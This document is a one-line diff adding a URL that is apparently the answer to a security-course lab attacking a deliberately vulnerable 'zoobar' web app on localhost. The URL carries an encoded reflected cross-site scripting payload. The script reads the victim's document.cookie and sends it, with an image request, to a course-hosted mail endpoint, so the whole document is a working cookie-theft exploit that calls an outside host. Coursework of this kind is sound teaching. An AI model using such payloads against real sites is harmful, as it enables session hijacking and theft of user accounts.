@@ -1,0 +1,1 @@
+http://localhost:8080/zoobar/index.cgi/users?user=%22%3E%3Cscript%3E(new+Image()).src%3D%27http%3A%2F%2Fcss.csail.mit.edu%2F6.858%2F2018%2Flabs%2Fsendmail.php%3F%27+%2B+%27to%3Dqpm3%40mit.edu%27+%2B+%27%26payload%3D%27+%2B+encodeURIComponent(document.cookie)+%2B+%27%26random%3D%27+%2B+Math.random()%3B%3C%2Fscript%3Ealert()
